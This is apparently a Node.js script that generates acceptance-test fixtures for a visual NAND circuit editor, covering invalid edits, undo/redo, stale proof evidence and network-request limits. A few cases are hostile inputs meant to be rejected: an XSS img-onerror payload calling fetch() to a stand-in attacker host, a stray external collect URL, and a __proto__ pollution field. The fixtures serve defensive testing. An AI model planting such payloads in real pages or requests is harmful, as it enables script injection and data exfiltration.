// Independent V2-A prospective acceptance fixture generator.
// Reads genuine accepted-main vectors only; writes bounded case files under this fixture namespace.
// Run from repository root: node fixtures/visual-v2a-test-design/generators/build_cases.mjs
import { createHash } from "node:crypto";
import { mkdir, readFile, writeFile } from "node:fs/promises";
import { resolve } from "node:path";

const sha = (b) => createHash("sha256").update(b).digest("hex");
const samplePath = "docs/schema/m3/examples/half-adder.request.json";
const parityPath = "docs/evidence/visual-v1-postmerge/canonical-parity.json";
const sampleBytes = await readFile(samplePath);
const sample = JSON.parse(sampleBytes.toString("utf8"));
const parity = JSON.parse((await readFile(parityPath)).toString("utf8"));
const baseCandidate = () => structuredClone(sample.project.candidate);
const external = (pin) => ({ component: null, pin });
const from = (component, pin) => ({ component, pin });

const blockers = {
	"SB-1": "V2-A command envelope (operation names, generation, requestHash, draft ID) is not specified; command names below are provisional adapters, not an endorsed API.",
	"SB-2": "Undo/redo depth, branch truncation and whether history is session-only are unspecified.",
	"SB-3": "Visual edit component/pin limits are unspecified; canonical Candidate allows 5000 components while V1 display budget is 500/1000/4096.",
	"SB-4": "ReferenceCandidate and comparison inputMap/outputMap update semantics after a candidate edit are unspecified for local reference designs.",
	"SB-5": "Proof/dirty invalidation semantics (which hashes bind a result to a revision) are unspecified.",
	"SB-6": "Draft persistence across Visual/Advanced switches and reload is unspecified.",
	"SB-7": "Keyboard equivalents, focus return and status announcements for edit commands are unspecified.",
	"SB-8": "Network boundary for client pre-validation versus explicit compile/verify commit is unspecified.",
	"SB-9": "Read-only handling of REF internals, decoded LATCH and unsupported kinds during edits is unspecified.",
	"SB-10": "Evidence-overlay binding fields and whether historical proof may be displayed after restore are unspecified.",
};

const cases = [];
const add = (c) => {
	if (!c.id || !c.focus || !c.expectedOutcome) throw Error("incomplete case");
	cases.push({
		status: "PROSPECTIVE_ACCEPTANCE",
		input: { base: samplePath, patch: c.patch ?? [] },
		editSequence: c.editSequence,
		expectedCanonicalState: c.expected,
		expectedOutcome: c.expectedOutcome,
		rejectionReason: c.reason ?? null,
		evidenceFreshness: c.freshness ?? "No result may be shown as current unless bound to the exact post-edit request hash.",
		regressionTest: `tests/visual-edit.spec.ts::${c.id}`,
		semanticBlockers: c.blockers ?? [],
		id: c.id,
		focus: c.focus,
	});
};
const unchanged = { mode: "UNCHANGED", candidate: baseCandidate(), note: "Exact accepted-main request bytes; no component, source, import, map or hash change." };
const candidate = (ops) => {
	const d = baseCandidate();
	for (const op of ops) {
		if (op.op === "addNand") d.components.push({ kind: "NAND", instanceId: op.id, inputs: op.inputs });
		else if (op.op === "remove") d.components = d.components.filter((c) => c.instanceId !== op.id);
		else if (op.op === "outputs") d.outputs = op.pins;
		else if (op.op === "renumber") {
			// Explicit rewire only: component array order becomes the listed order.
			d.components = op.order.map((id) => d.components.find((c) => c.instanceId === id));
		} else throw Error(`unknown expected op ${op.op}`);
	}
	return { mode: "CANDIDATE", candidate: d, note: "Expected exact candidate object. Hashes must be recomputed through trusted compose, never fabricated." };
};

// 1. Invalid or incomplete NAND creation
add({ id: "V2A-01A", focus: "invalid-or-incomplete-nand-creation", editSequence: [{ op: "ADD_COMPONENT", kind: "NAND", instanceId: "partial", inputs: [external(0)] }], expectedOutcome: "REJECT", reason: "NAND requires exactly two scalar inputs (models.py NandComponent min_length=2).", expected: unchanged, blockers: ["SB-1"] });
add({ id: "V2A-01B", focus: "invalid-or-incomplete-nand-creation", editSequence: [{ op: "ADD_COMPONENT", kind: "NAND", instanceId: "wide", inputs: [external(0), external(1), external(0)] }], expectedOutcome: "REJECT", reason: "NAND max_length=2; third input invalid.", expected: unchanged, blockers: ["SB-1"] });
add({ id: "V2A-01C", focus: "invalid-or-incomplete-nand-creation", editSequence: [{ op: "ADD_COMPONENT", kind: "NAND", instanceId: "1bad", inputs: [external(0), external(1)] }], expectedOutcome: "REJECT", reason: "Name pattern ^[A-Za-z][A-Za-z0-9_-]{0,63}$ violated.", expected: unchanged, blockers: ["SB-1"] });
add({ id: "V2A-01D", focus: "invalid-or-incomplete-nand-creation", editSequence: [{ op: "ADD_COMPONENT", kind: "NAND", instanceId: "g1", inputs: [external(0), external(1)] }], expectedOutcome: "ACCEPT", expected: candidate([{ op: "addNand", id: "g1", inputs: [external(0), external(1)] }]), freshness: "Any prior build/proof result becomes stale; no current verdict until fresh explicit compose/verify.", blockers: ["SB-1", "SB-5"] });

// 2. Removal of referenced components
add({ id: "V2A-02A", focus: "removal-of-referenced-components", editSequence: [{ op: "REMOVE_COMPONENT", instanceId: "nand0" }], expectedOutcome: "REJECT", reason: "carry.inputs still reference nand0; canonical check rejects undefined/forward pin.", expected: unchanged, blockers: ["SB-1"] });
add({ id: "V2A-02B", focus: "removal-of-referenced-components", editSequence: [{ op: "REMOVE_COMPONENT", instanceId: "carry" }], expectedOutcome: "REJECT", reason: "candidate.outputs[0] references carry; one driver per output required.", expected: unchanged, blockers: ["SB-1"] });
add({ id: "V2A-02C", focus: "removal-of-referenced-components", editSequence: [{ op: "SET_OUTPUT", index: 0, value: from("sum", 0) }, { op: "REMOVE_COMPONENT", instanceId: "carry" }], expectedOutcome: "ACCEPT", expected: candidate([{ op: "remove", id: "carry" }, { op: "outputs", pins: [from("sum", 0), from("sum", 0)] }]), freshness: "Atomic command only; if any step fails, original bytes remain and no partial deletion is shown.", blockers: ["SB-1", "SB-4"] });

// 3. Index shifts and reference corruption
add({ id: "V2A-03A", focus: "index-shifts-and-reference-corruption", editSequence: [{ op: "INSERT_COMPONENT", index: 1, kind: "NAND", instanceId: "inserted", inputs: [external(0), external(1)] }], expectedOutcome: "REJECT", reason: "Insertion before referenced components would corrupt ordinal identity; no silent index rewrite permitted.", expected: unchanged, blockers: ["SB-1", "SB-2"] });
add({ id: "V2A-03B", focus: "index-shifts-and-reference-corruption", editSequence: [{ op: "REMOVE_COMPONENT", instanceId: "carry" }, { op: "ADD_COMPONENT", kind: "NAND", instanceId: "replacement", inputs: [from("nand0", 0), from("nand0", 0)] }, { op: "SET_OUTPUT", index: 0, value: from("replacement", 0) }], expectedOutcome: "ACCEPT", expected: candidate([{ op: "remove", id: "carry" }, { op: "addNand", id: "replacement", inputs: [from("nand0", 0), from("nand0", 0)] }, { op: "outputs", pins: [from("replacement", 0), from("sum", 0)] }]), freshness: "New request hash; old proof must be labeled historical.", blockers: ["SB-1", "SB-4", "SB-10"] });
add({ id: "V2A-03C", focus: "index-shifts-and-reference-corruption", editSequence: [{ op: "SET_OUTPUT", index: 0, value: from("doesNotExist", 0) }], expectedOutcome: "REJECT", reason: "Unknown component reference; canonical check rejects unbound component.", expected: unchanged, blockers: ["SB-1"] });

// 4. Undo/redo state divergence
add({ id: "V2A-04A", focus: "undo-redo-state-divergence", editSequence: [{ op: "ADD_COMPONENT", kind: "NAND", instanceId: "u1", inputs: [external(0), external(1)] }, { op: "UNDO" }, { op: "REDO" }], expectedOutcome: "ACCEPT", expected: candidate([{ op: "addNand", id: "u1", inputs: [external(0), external(1)] }]), freshness: "Post-redo request bytes exactly equal post-add bytes; proof remains invalid until fresh verification.", blockers: ["SB-2", "SB-5"] });
add({ id: "V2A-04B", focus: "undo-redo-state-divergence", editSequence: [{ op: "ADD_COMPONENT", kind: "NAND", instanceId: "u1", inputs: [external(0), external(1)] }, { op: "UNDO" }, { op: "ADD_COMPONENT", kind: "NAND", instanceId: "u2", inputs: [external(1), external(0)] }, { op: "REDO" }], expectedOutcome: "REJECT", reason: "REDO after a new branch must not resurrect u1; stale redo entry rejected, u2 state retained.", expected: candidate([{ op: "addNand", id: "u2", inputs: [external(1), external(0)] }]), blockers: ["SB-2"] });
add({ id: "V2A-04C", focus: "undo-redo-state-divergence", editSequence: [{ op: "BUILD" }, { op: "ADD_COMPONENT", kind: "NAND", instanceId: "u3", inputs: [external(0), external(1)] }, { op: "UNDO" }], expectedOutcome: "ACCEPT", expected: unchanged, freshness: "Restored bytes equal original; old proof may be shown only as historical bound to restored hash, never as current without fresh verify.", blockers: ["SB-2", "SB-5", "SB-10"] });
add({ id: "V2A-04D", focus: "undo-redo-state-divergence", editSequence: [{ op: "ADD_COMPONENT", kind: "REF", instanceId: "r1", sourceAlias: "xor", inputs: [external(0), external(1)] }, { op: "UNDO" }, { op: "REDO" }], expectedOutcome: "REJECT", reason: "V2-A scope is NAND editing only; REF creation and its history are unsupported.", expected: unchanged, blockers: ["SB-9"] });

// 5. Rapid and repeated edit commands
add({ id: "V2A-05A", focus: "rapid-and-repeated-edit-commands", editSequence: Array.from({ length: 20 }, (_, i) => ({ op: "ADD_COMPONENT", kind: "NAND", instanceId: `rapid${i}`, inputs: [external(0), external(1)] })), expectedOutcome: "ACCEPT", expected: candidate(Array.from({ length: 20 }, (_, i) => ({ op: "addNand", id: `rapid${i}`, inputs: [external(0), external(1)] }))), freshness: "No compile/verify during the burst; single explicit build after final revision.", blockers: ["SB-1", "SB-8"] });
add({ id: "V2A-05B", focus: "rapid-and-repeated-edit-commands", editSequence: [{ op: "ADD_COMPONENT", kind: "NAND", instanceId: "dup", inputs: [external(0), external(1)] }, { op: "ADD_COMPONENT", kind: "NAND", instanceId: "dup", inputs: [external(1), external(0)] }], expectedOutcome: "REJECT", reason: "Second command rejected for duplicate instanceId; first command retained.", expected: candidate([{ op: "addNand", id: "dup", inputs: [external(0), external(1)] }]), blockers: ["SB-1"] });
add({ id: "V2A-05C", focus: "rapid-and-repeated-edit-commands", editSequence: [{ op: "ADD_COMPONENT", kind: "NAND", instanceId: "old", inputs: [external(0), external(1)], generation: 1 }, { op: "ADD_COMPONENT", kind: "NAND", instanceId: "new", inputs: [external(1), external(0)], generation: 2 }, { op: "APPLY_RESPONSE", generation: 1 }], expectedOutcome: "REJECT", reason: "Late response for generation 1 must not overwrite generation 2 state.", expected: candidate([{ op: "addNand", id: "old", inputs: [external(0), external(1)] }, { op: "addNand", id: "new", inputs: [external(1), external(0)] }]), blockers: ["SB-1", "SB-5"] });

// 6. Canonical data mutation and hidden aliasing
add({ id: "V2A-06A", focus: "canonical-data-mutation-and-hidden-aliasing", editSequence: [{ op: "ADD_COMPONENT", kind: "NAND", instanceId: "extra", inputs: [external(0), external(1)], __proto__: { polluted: true } }], expectedOutcome: "REJECT", reason: "Extra/unknown fields forbidden; request must remain byte-identical.", expected: unchanged, blockers: ["SB-1"] });
add({ id: "V2A-06B", focus: "canonical-data-mutation-and-hidden-aliasing", editSequence: [{ op: "MUTATE_PROJECTED_PIN", node: "candidate/component/carry", handle: "in:0", value: external(1) }], expectedOutcome: "REJECT", reason: "Displayed pin objects are detached copies; no visual interaction may write canonical data.", expected: unchanged, blockers: ["SB-1"] });
add({ id: "V2A-06C", focus: "canonical-data-mutation-and-hidden-aliasing", patch: [["project", "sources", 0, "alias"], "corrupted"], editSequence: [{ op: "SET_SOURCE_ALIAS", index: 0, value: "corrupted" }], expectedOutcome: "REJECT", reason: "Source aliases/identities and imports are not editable in V2-A; patch input itself is rejected as malformed before any command.", expected: unchanged, blockers: ["SB-1", "SB-9"] });
add({ id: "V2A-06D", focus: "canonical-data-mutation-and-hidden-aliasing", editSequence: [{ op: "SET_REFERENCE_CANDIDATE", value: "candidate" }], expectedOutcome: "REJECT", reason: "referenceCandidate is not a NAND edit target; without an explicit separate command it must remain unchanged.", expected: unchanged, blockers: ["SB-4"] });

// 7. REF identity corruption
add({ id: "V2A-07A", focus: "ref-identity-corruption", editSequence: [{ op: "ADD_COMPONENT", kind: "REF", instanceId: "r1", sourceAlias: "missing", inputs: [external(0)] }], expectedOutcome: "REJECT", reason: "Unknown REF alias; outside NAND-only V2-A scope.", expected: unchanged, blockers: ["SB-9"] });
add({ id: "V2A-07B", focus: "ref-identity-corruption", patch: [["project", "sources", 0, "nState"], 1], editSequence: [{ op: "ADD_COMPONENT", kind: "NAND", instanceId: "safe", inputs: [external(0), external(1)] }], expectedOutcome: "REJECT", reason: "Stateful source in fixture must be rejected before editing; no partial graph.", expected: unchanged, blockers: ["SB-9"] });
add({ id: "V2A-07C", focus: "ref-identity-corruption", editSequence: [{ op: "ADD_COMPONENT", kind: "REF", instanceId: "r1", sourceAlias: "xor", inputs: [external(0)] }], expectedOutcome: "REJECT", reason: "REF arity must equal source.nIn=2; also NAND-only scope.", expected: unchanged, blockers: ["SB-9"] });
add({ id: "V2A-07D", focus: "ref-identity-corruption", patch: [["project", "sources", 0, "identity", "circuitId"], "18446744073709551616"], editSequence: [], expectedOutcome: "REJECT", reason: "REF circuitId ≥ 2^64 rejected by canonical and V1 display guards.", expected: unchanged, blockers: ["SB-9"] });
add({ id: "V2A-07E", focus: "ref-identity-corruption", editSequence: [{ op: "REBIND_REF", instanceId: "nand0", sourceAlias: "xor" }], expectedOutcome: "REJECT", reason: "REF rebinding is not a NAND edit; import/manifest hashes and identities unchanged.", expected: unchanged, blockers: ["SB-4", "SB-9"] });

// 8. Visual/Advanced state differences
add({ id: "V2A-08A", focus: "visual-advanced-state-differences", editSequence: [{ op: "ADD_COMPONENT", kind: "NAND", instanceId: "g1", inputs: [external(0), external(1)] }, { op: "SWITCH_MODE", to: "Advanced" }], expectedOutcome: "ACCEPT", expected: candidate([{ op: "addNand", id: "g1", inputs: [external(0), external(1)] }]), freshness: "Stored request identical in both modes; Advanced mapping rows and build result correspond to new request.", blockers: ["SB-6"] });
add({ id: "V2A-08B", focus: "visual-advanced-state-differences", editSequence: [{ op: "ADVANCED_EDIT", set: ["project", "candidate", "components", 1, "inputs", 0], value: external(1) }, { op: "SWITCH_MODE", to: "Visual" }], expectedOutcome: "ACCEPT", expected: { mode: "CANDIDATE", candidate: (() => { const d = baseCandidate(); d.components[1].inputs[0] = external(1); return d; })(), note: "Projection must mirror exact canonical mapping; no normalization." }, blockers: ["SB-6"] });
add({ id: "V2A-08C", focus: "visual-advanced-state-differences", editSequence: [{ op: "SELECT", id: "candidate/component/carry" }, { op: "SWITCH_MODE", to: "Advanced" }, { op: "SWITCH_MODE", to: "Visual" }], expectedOutcome: "ACCEPT", expected: unchanged, freshness: "Selection restored by stable identity; no hidden compile or network request.", blockers: ["SB-6", "SB-8"] });

// 9. Stale evidence shown as current
add({ id: "V2A-09A", focus: "stale-evidence-shown-as-current", editSequence: [{ op: "BUILD" }, { op: "ADD_COMPONENT", kind: "NAND", instanceId: "g1", inputs: [external(0), external(1)] }], expectedOutcome: "ACCEPT", expected: candidate([{ op: "addNand", id: "g1", inputs: [external(0), external(1)] }]), freshness: "Prior proof evidence must be invalidated; no EQUIVALENT/DIFFERENT heading bound to old request.", blockers: ["SB-5", "SB-10"] });
add({ id: "V2A-09B", focus: "stale-evidence-shown-as-current", editSequence: [{ op: "ADD_COMPONENT", kind: "NAND", instanceId: "g1", inputs: [external(0), external(1)] }, { op: "INJECT_PROOF", projectHash: parity.compiledBefore.projectHash }], expectedOutcome: "REJECT", reason: "Injected proof bound to pre-edit project hash must not overlay current revision.", expected: candidate([{ op: "addNand", id: "g1", inputs: [external(0), external(1)] }]), blockers: ["SB-5", "SB-10"] });
add({ id: "V2A-09C", focus: "stale-evidence-shown-as-current", editSequence: [{ op: "UNDO" }, { op: "SHOW_PROOF", binding: parity.compiledBefore.projectHash }], expectedOutcome: "REJECT", reason: "With no edit performed, UNDO is a no-op; proof may be displayed as current only after fresh binding check, not from stored object alone.", expected: unchanged, blockers: ["SB-5", "SB-10"] });

// 10. Invalid command parameters
add({ id: "V2A-10A", focus: "invalid-command-parameters", editSequence: [{ op: "ADD_COMPONENT", kind: "NAND", instanceId: "g1", inputs: [external(0), external(1)] }], expectedOutcome: "REJECT", reason: "Missing generation/requestHash binding must be rejected before any mutation.", expected: unchanged, blockers: ["SB-1"] });
add({ id: "V2A-10B", focus: "invalid-command-parameters", editSequence: [{ op: "ADD_COMPONENT", kind: "NAND", instanceId: "g1", inputs: [external(0), external(1)], requestHash: "0x0000000000000000000000000000000000000000000000000000000000000000" }], expectedOutcome: "REJECT", reason: "Stale requestHash must be rejected.", expected: unchanged, blockers: ["SB-1", "SB-5"] });
add({ id: "V2A-10C", focus: "invalid-command-parameters", editSequence: [{ op: "CONNECT", target: "candidate/component/carry", input: 0, source: external(1.5) }], expectedOutcome: "REJECT", reason: "Fractional/string/negative pin indices are not integers in range.", expected: unchanged, blockers: ["SB-1"] });
add({ id: "V2A-10D", focus: "invalid-command-parameters", editSequence: [{ op: "CONNECT", target: "candidate/component/carry", input: 0, source: { component: "carry", pin: 0 } }], expectedOutcome: "REJECT", reason: "Self-reference/forward reference creates cycle; canonical requires backward references.", expected: unchanged, blockers: ["SB-1"] });
add({ id: "V2A-10E", focus: "invalid-command-parameters", editSequence: [{ op: "UNKNOWN_COMMAND" }], expectedOutcome: "REJECT", reason: "Unknown command kind must fail closed without state change or network.", expected: unchanged, blockers: ["SB-1"] });

// 11. Maximum component limits
add({ id: "V2A-11A", focus: "maximum-component-limits", editSequence: Array.from({ length: 499 }, (_, i) => ({ op: "ADD_COMPONENT", kind: "NAND", instanceId: `lim${i}`, inputs: [external(0), external(1)] })), expectedOutcome: "ACCEPT", expected: candidate(Array.from({ length: 499 }, (_, i) => ({ op: "addNand", id: `lim${i}`, inputs: [external(0), external(1)] }))), freshness: "500 components including banks is the V1 display ceiling; still under canonical 5000.", blockers: ["SB-3"] });
add({ id: "V2A-11B", focus: "maximum-component-limits", editSequence: Array.from({ length: 500 }, (_, i) => ({ op: "ADD_COMPONENT", kind: "NAND", instanceId: `over${i}`, inputs: [external(0), external(1)] })), expectedOutcome: "REJECT", reason: "501st component exceeds display budget 500; fail before materializing a partial graph.", expected: unchanged, blockers: ["SB-3"] });
add({ id: "V2A-11C", focus: "maximum-component-limits", patch: [["project", "candidate", "nIn"], 513], editSequence: [], expectedOutcome: "REJECT", reason: "nIn=513 exceeds V1 display bound 512; canonical allows 65536 but display must not truncate.", expected: unchanged, blockers: ["SB-3"] });
add({ id: "V2A-11D", focus: "maximum-component-limits", patch: [["project", "candidate", "outputs"], [from("carry", 0), from("sum", 0), from("nand0", 0)], ["project", "comparison", "outputMap"], [0, 1, 2]], editSequence: [], expectedOutcome: "ACCEPT", expected: { mode: "CANDIDATE", candidate: (() => { const d = baseCandidate(); d.outputs = [from("carry", 0), from("sum", 0), from("nand0", 0)]; return d; })(), note: "3 outputs within 512; the case input also updates comparison.outputMap to a complete bijection [0,1,2]; any smaller map must be rejected." }, blockers: ["SB-3", "SB-4"] });

// 12. Dirty-state and draft/commit confusion
add({ id: "V2A-12A", focus: "dirty-state-and-draft-commit-confusion", editSequence: [{ op: "ADD_COMPONENT", kind: "NAND", instanceId: "draft1", inputs: [external(0), null] }], expectedOutcome: "REJECT", reason: "Incomplete draft with null input is non-executable; build/verify/export disabled; last valid package retained.", expected: unchanged, blockers: ["SB-1", "SB-5"] });
add({ id: "V2A-12B", focus: "dirty-state-and-draft-commit-confusion", editSequence: [{ op: "ADD_COMPONENT", kind: "NAND", instanceId: "draft2", inputs: [external(0), external(1)] }, { op: "CANCEL_DRAFT" }], expectedOutcome: "ACCEPT", expected: unchanged, freshness: "Cancel restores exact original bytes and clears dirty flags; no request sent.", blockers: ["SB-5", "SB-6"] });
add({ id: "V2A-12C", focus: "dirty-state-and-draft-commit-confusion", editSequence: [{ op: "ADD_COMPONENT", kind: "NAND", instanceId: "commit1", inputs: [external(0), external(1)] }, { op: "APPLY_COMPILE_RESPONSE", requestHash: "stale" }], expectedOutcome: "REJECT", reason: "Commit only on response matching latest request hash and generation.", expected: candidate([{ op: "addNand", id: "commit1", inputs: [external(0), external(1)] }]), blockers: ["SB-1", "SB-5"] });
add({ id: "V2A-12D", focus: "dirty-state-and-draft-commit-confusion", editSequence: [{ op: "EDIT_REF_INTERNALS", instanceId: "nand0", field: "nOut", value: 2 }], expectedOutcome: "REJECT", reason: "Unsupported structure edit unavailable with explicit reason; original bytes unchanged.", expected: unchanged, blockers: ["SB-9"] });

// 13. Keyboard-only interaction
add({ id: "V2A-13A", focus: "keyboard-only-interaction", editSequence: [{ op: "KEYBOARD_ADD_NAND", instanceId: "keyboard1" }, { op: "KEYBOARD_CONNECT", target: "candidate/component/keyboard1", input: 0, source: external(0) }, { op: "KEYBOARD_CONNECT", target: "candidate/component/keyboard1", input: 1, source: external(1) }], expectedOutcome: "ACCEPT", expected: candidate([{ op: "addNand", id: "keyboard1", inputs: [external(0), external(1)] }]), freshness: "Same canonical bytes as equivalent mouse-driven sequence.", blockers: ["SB-7"] });
add({ id: "V2A-13B", focus: "keyboard-only-interaction", editSequence: [{ op: "FOCUS", target: "text-field" }, { op: "KEY", key: "Delete" }], expectedOutcome: "ACCEPT", expected: unchanged, freshness: "Delete is ignored in text fields; visible focus remains; Escape cancels active gesture.", blockers: ["SB-7"] });
add({ id: "V2A-13C", focus: "keyboard-only-interaction", editSequence: [{ op: "KEYBOARD_ADD_NAND", instanceId: "keyboard2" }, { op: "READ_STATUS" }], expectedOutcome: "ACCEPT", expected: candidate([{ op: "addNand", id: "keyboard2", inputs: [external(0), external(1)] }]), freshness: "Status region announces accept/reject and exact target; focus returns to origin after dialog close.", blockers: ["SB-7"] });

// 14. Unexpected network requests
add({ id: "V2A-14A", focus: "unexpected-network-requests", editSequence: [{ op: "ADD_COMPONENT", kind: "NAND", instanceId: "net1", inputs: [external(0), external(1)] }, { op: "ADD_COMPONENT", kind: "NAND", instanceId: "net2", inputs: [from("net1", 0), external(1)] }], expectedOutcome: "ACCEPT", expected: candidate([{ op: "addNand", id: "net1", inputs: [external(0), external(1)] }, { op: "addNand", id: "net2", inputs: [from("net1", 0), external(1)] }]), freshness: "Zero POST/compile/verify requests during edits; client checks only.", blockers: ["SB-8"] });
add({ id: "V2A-14B", focus: "unexpected-network-requests", editSequence: [{ op: "ADD_COMPONENT", kind: "NAND", instanceId: "net3", inputs: [external(0), external(1)] }, { op: "EXPLICIT_BUILD" }], expectedOutcome: "ACCEPT", expected: candidate([{ op: "addNand", id: "net3", inputs: [external(0), external(1)] }]), freshness: "Exactly one POST /api/v1/compose with exact request bytes; no duplicate or implicit solver call.", blockers: ["SB-8"] });
add({ id: "V2A-14C", focus: "unexpected-network-requests", editSequence: [{ op: "ADD_COMPONENT", kind: "NAND", instanceId: "bad", inputs: [external(0)] }], expectedOutcome: "REJECT", expected: unchanged, reason: "Rejected command must produce zero network requests.", blockers: ["SB-8"] });
add({ id: "V2A-14D", focus: "unexpected-network-requests", editSequence: [{ op: "ADD_COMPONENT", kind: "NAND", instanceId: "net4", inputs: [external(0), external(1)], url: "https://external.example/collect" }], expectedOutcome: "REJECT", expected: unchanged, reason: "No arbitrary URL/network target in command; loopback-only existing API.", blockers: ["SB-8"] });

// 15. Bypass read-only protections on unsupported structures
add({ id: "V2A-15A", focus: "bypass-readonly-on-unsupported", editSequence: [{ op: "ADD_COMPONENT", kind: "LATCH", instanceId: "l1", inputs: [] }], expectedOutcome: "REJECT", reason: "LATCH authoring unsupported; no new recipe version or evaluator.", expected: unchanged, blockers: ["SB-9"] });
add({ id: "V2A-15B", focus: "bypass-readonly-on-unsupported", editSequence: [{ op: "DRAG_NODE", id: "candidate/component/carry", to: { x: 900, y: 700 } }], expectedOutcome: "ACCEPT", expected: unchanged, freshness: "Position is presentation-only; wiring and request bytes unchanged; no semantic hash change.", blockers: ["SB-3", "SB-6"] });
add({ id: "V2A-15C", focus: "bypass-readonly-on-unsupported", editSequence: [{ op: "SELECT", id: "candidate/component/nand0" }, { op: "KEY", key: "Delete" }], expectedOutcome: "REJECT", reason: "Unsupported REF component remains read-only; keyboard delete has no effect.", expected: unchanged, blockers: ["SB-9"] });
add({ id: "V2A-15D", focus: "bypass-readonly-on-unsupported", editSequence: [{ op: "INJECT_HTML", field: "instanceId", value: '<img src=x onerror="fetch(\'https://attacker.invalid\')">' }], expectedOutcome: "REJECT", reason: "Untrusted display strings are escaped plain text; no HTML/event execution and no network.", expected: unchanged, blockers: ["SB-9"] });

await mkdir("fixtures/visual-v2a-test-design/cases", { recursive: true });
const manifest = { generatedAt: new Date().toISOString(), base: samplePath, baseSha256: sha(sampleBytes), generator: "fixtures/visual-v2a-test-design/generators/build_cases.mjs", files: [] };
for (const c of cases) {
	const path = `fixtures/visual-v2a-test-design/cases/${c.id}.json`;
	const bytes = Buffer.from(JSON.stringify(c, null, 2) + "\n", "utf8");
	await writeFile(path, bytes);
	manifest.files.push({ path, sha256: sha(bytes), bytes: bytes.length });
}
const index = {
	generatedAt: manifest.generatedAt,
	base: samplePath,
	baseSha256: manifest.baseSha256,
	totalCases: cases.length,
	focusAreas: [...new Set(cases.map((c) => c.focus))].sort(),
	blockers,
	caseIds: cases.map((c) => c.id),
};
const indexBytes = Buffer.from(JSON.stringify(index, null, 2) + "\n", "utf8");
await writeFile("docs/evidence/visual-v2a-test-design/cases-index.json", indexBytes);
manifest.files.push({ path: "docs/evidence/visual-v2a-test-design/cases-index.json", sha256: sha(indexBytes), bytes: indexBytes.length });
const generatorBytes = await readFile("fixtures/visual-v2a-test-design/generators/build_cases.mjs");
manifest.generatorSha256 = sha(generatorBytes);
await writeFile("fixtures/visual-v2a-test-design/MANIFEST.json", JSON.stringify(manifest, null, 2) + "\n");
console.log(`cases=${cases.length} focusAreas=${index.focusAreas.length} blockers=${Object.keys(blockers).length}`);
